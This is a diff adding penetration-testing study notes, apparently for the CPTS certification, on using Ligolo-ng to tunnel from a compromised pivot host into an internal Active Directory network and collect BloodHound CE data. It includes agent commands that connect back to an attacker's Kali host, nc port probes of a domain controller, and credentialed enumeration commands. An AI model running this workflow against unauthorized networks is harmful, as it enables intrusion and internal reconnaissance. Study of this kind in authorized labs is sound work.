@@ -1,0 +1,504 @@
+---
+title: "Ligolo-ng and BloodHound Setup"
+description: "CPTS study notes, workflows, and references from the vault."
+---
+
+{/* Generated from Pivoting/Ligolo-ng and BloodHound Setup.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Pivoting index](/pivoting/index) · [AD study path](/active-directory/index)
+
+> **Authorization**
+> Use only on systems and networks where you have explicit permission, such as an authorized lab or
+> assessment.
+
+## Overview
+
+```text
+Kali: proxy + TUN interface + BloodHound CE
+              ▲
+              │ reverse TLS connection
+              │
+Target: agent ─┴─ internal AD network
+```
+
+- proxy runs on Kali.
+- agent runs on the target/pivot.
+- The target makes an outbound connection to Kali.
+- Kali routes the target’s internal network through a TUN interface.
+- BloodHound runs normally through that route.
+
+Official docs: [Ligolo quickstart](https://docs.ligolo.ng/Quickstart/)
+
+## Variables
+
+Replace these placeholders:
+
+```text
+KALI_IP       = Kali IP reachable by the target
+DC_IP         = Domain Controller IP
+DC_FQDN       = Domain Controller hostname
+AD_SUBNET     = Internal subnet reachable through the target
+AD_DOMAIN     = inlanefreight.local
+```
+
+Example values:
+
+```text
+KALI_IP       = 10.10.14.25
+DC_IP         = 10.10.10.10
+DC_FQDN       = dc01.inlanefreight.local
+AD_SUBNET     = 10.10.10.0/24
+AD_DOMAIN     = inlanefreight.local
+```
+
+## 1. Download the binaries
+
+From the Ligolo-ng releases page:
+
+[Ligolo releases](https://github.com/nicocha30/ligolo-ng/releases)
+
+For standard 64-bit Kali, download:
+
+```text
+proxy_linux_amd64
+```
+
+For the target, download the matching agent:
+
+```text
+agent_windows_amd64   # 64-bit Windows
+agent_linux_amd64     # 64-bit Linux
+agent_windows_386     # 32-bit Windows
+agent_linux_arm64     # ARM64 Linux
+```
+
+Check Kali’s architecture:
+
+```bash
+uname -m
+```
+
+Common mappings:
+
+```text
+x86_64  -> amd64
+aarch64 -> arm64
+i386    -> 386
+```
+
+The target needs only agent or agent.exe. Kali needs only proxy.
+
+## 2. Prepare the proxy on Kali
+
+```bash
+mkdir -p ~/ligolo
+cd ~/ligolo
+chmod +x proxy
+./proxy -h
+```
+
+## 3. Start the proxy on Kali
+
+```bash
+cd ~/ligolo
+sudo ./proxy -selfcert
+```
+
+Default listening port:
+
+```text
+11601/TCP
+```
+
+Keep this terminal open.
+
+For a lab, the target can ignore certificate verification:
+
+```bash
+-ignore-cert
+```
+
+For better security, use the certificate fingerprint printed by the proxy:
+
+```bash
+./agent -connect KALI_IP:11601 \
+  -accept-fingerprint FINGERPRINT
+```
+
+## 4. Start the agent on the target
+
+### Linux target
+
+```bash
+chmod +x agent
+./agent -connect KALI_IP:11601 -ignore-cert
+```
+
+Example:
+
+```bash
+./agent -connect 10.10.14.25:11601 -ignore-cert
+```
+
+### Windows target
+
+```powershell
+.\agent.exe -connect KALI_IP:11601 -ignore-cert
+```
+
+The target must be able to connect outbound to:
+
+```text
+KALI_IP:11601
+```
+
+The agent normally does not require root or Administrator privileges.
+
+## 5. Select the agent
+
+In the Kali proxy terminal:
+
+```text
+session
+```
+
+Select the connected session, normally:
+
+```text
+1
+```
+
+You should see the target hostname and connection details.
+
+## 6. Create the TUN interface
+
+At the Ligolo proxy prompt:
+
+```text
+interface_create --name ligolo
+```
+
+If that command is unavailable, use a second Kali terminal:
+
+```bash
+sudo ip tuntap add user "$USER" mode tun ligolo
+sudo ip link set ligolo up
+```
+
+Verify it:
+
+```bash
+ip addr show ligolo
+```
+
+## 7. Start the tunnel
+
+At the selected-agent prompt:
+
+```text
+tunnel_start --tun ligolo
+```
+
+The tunnel is now active.
+
+## 8. Identify the internal subnet
+
+At the Ligolo agent prompt:
+
+```text
+ifconfig
+```
+
+Look for the interface connected to the internal AD network.
+
+Example:
+
+```text
+IPv4 Address 10.10.10.25/24
+```
+
+This normally means the subnet is:
+
+```text
+10.10.10.0/24
+```
+
+## 9. Add the route on Kali
+
+Using Ligolo’s route management:
+
+```text
+interface_add_route --name ligolo --route AD_SUBNET
+```
+
+Example:
+
+```text
+interface_add_route --name ligolo --route 10.10.10.0/24
+```
+
+Alternatively, add it manually from Kali:
+
+```bash
+sudo ip route add AD_SUBNET dev ligolo
+```
+
+Example:
+
+```bash
+sudo ip route add 10.10.10.0/24 dev ligolo
+```
+
+Verify:
+
+```bash
+ip route
+```
+
+If the target reaches multiple internal networks, add a route for each one.
+
+## 10. Test domain-controller connectivity
+
+```bash
+ping -c 2 DC_IP
+```
+
+Ping may be blocked, so also test TCP services:
+
+```bash
+nc -vz DC_IP 53
+nc -vz DC_IP 88
+nc -vz DC_IP 389
+nc -vz DC_IP 445
+nc -vz DC_IP 3268
+```
+
+Common AD services:
+
+```text
+ Port    Service
+━━━━━━  ━━━━━━━━━━━━━━━━━━━━━━
+   53    DNS
+──────  ──────────────────────
+   88    Kerberos
+──────  ──────────────────────
+  389    LDAP
+──────  ──────────────────────
+  636    LDAPS
+──────  ──────────────────────
+  445    SMB
+──────  ──────────────────────
+ 3268    Global Catalog LDAP
+──────  ──────────────────────
+ 3269    Global Catalog LDAPS
+```
+
+## 11. Fix hostname resolution
+
+BloodHound may need the domain controller’s hostname.
+
+Edit Kali’s hosts file:
+
+```bash
+sudoedit /etc/hosts
+```
+
+Add:
+
+```text
+DC_IP DC_FQDN dc01
+```
+
+Example:
+
+```text
+10.10.10.10 dc01.inlanefreight.local dc01
+```
+
+Test resolution:
+
+```bash
+getent hosts DC_FQDN
+```
+
+## 12. Run BloodHound CE collection
+
+Install the CE-compatible Python collector if necessary:
+
+```bash
+sudo apt update
+sudo apt install -y bloodhound-ce-python
+```
+
+> **Important**
+> Use bloodhound-ce-python, not the legacy bloodhound-python.
+
+### First test: domain-controller-only collection
+
+```bash
+bloodhound-ce-python \
+  -u 'USERNAME' \
+  -p 'PASSWORD' \
+  -ns 'DC_IP' \
+  -d 'AD_DOMAIN' \
+  -c DCOnly \
+  --zip
+```
+
+Example:
+
+```bash
+bloodhound-ce-python \
+  -u 'forend' \
+  -p 'YOUR_PASSWORD' \
+  -ns '10.10.10.10' \
+  -d 'inlanefreight.local' \
+  -c DCOnly \
+  --zip
+```
+
+### Full collection
+
+```bash
+bloodhound-ce-python \
+  -u 'USERNAME' \
+  -p 'PASSWORD' \
+  -ns 'DC_IP' \
+  -dc 'DC_FQDN' \
+  -d 'AD_DOMAIN' \
+  -c All \
+  --zip
+```
+
+Example:
+
+```bash
+bloodhound-ce-python \
+  -u 'forend' \
+  -p 'YOUR_PASSWORD' \
+  -ns '10.10.10.10' \
+  -dc 'dc01.inlanefreight.local' \
+  -d 'inlanefreight.local' \
+  -c All \
+  --zip
+```
+
+The ZIP is created in Kali’s current directory.
+
+Upload it in BloodHound CE:
+
+Administration → File Ingest
+
+## Troubleshooting
+
+### No agent session appears
+
+Check:
+
+- The target can reach KALI_IP
+- TCP port 11601 is allowed
+- The proxy is still running
+- The agent uses the correct Kali IP
+- Certificate options match on both sides
+
+### Tunnel starts but the DC is unreachable
+
+Check the target interface:
+
+```text
+ifconfig
+```
+
+Then confirm that the correct route was added:
+
+```bash
+ip route
+```
+
+The route must point the internal subnet through:
+
+```text
+ligolo
+```
+
+### DCOnly works but All fails
+
+This usually means the tunnel works, but the account or network cannot access individual computers through
+SMB/RPC. Verify:
+
+```bash
+nc -vz HOST_IP 445
+```
+
+Also confirm that all relevant internal subnets have routes.
+
+### BloodHound rejects the ZIP
+
+Check the archive:
+
+```bash
+unzip -t archive.zip
+unzip -l archive.zip
+```
+
+It should contain only BloodHound JSON files.
+
+Use output generated by:
+
+```bash
+bloodhound-ce-python
+```
+
+or SharpHound CE—not the legacy:
+
+```bash
+bloodhound-python
+```
+
+## Cleanup
+
+Stop the agent:
+
+```text
+Ctrl+C
+```
+
+Stop the proxy:
+
+```text
+Ctrl+C
+```
+
+Remove a manually added route:
+
+```bash
+sudo ip route del AD_SUBNET dev ligolo
+```
+
+Example:
+
+```bash
+sudo ip route del 10.10.10.0/24 dev ligolo
+```
+
+Remove a manually created TUN interface:
+
+```bash
+sudo ip link delete ligolo
+```
+
+## Quick reference
+
+1. Start proxy on Kali
+2. Start agent on target
+3. Select session
+4. Create TUN interface
+5. Start tunnel
+6. Run ifconfig in Ligolo
+7. Add internal route on Kali
+8. Test DC ports
+9. Run bloodhound-ce-python
+10. Upload the generated ZIP
+11. Remove the route when finished
+
+Source: [original setup note](/downloads/ligolo-ng-setup-8fafa4f8.txt). Collector compatibility: [BloodHound.py documentation](https://github.com/dirkjanm/BloodHound.py).
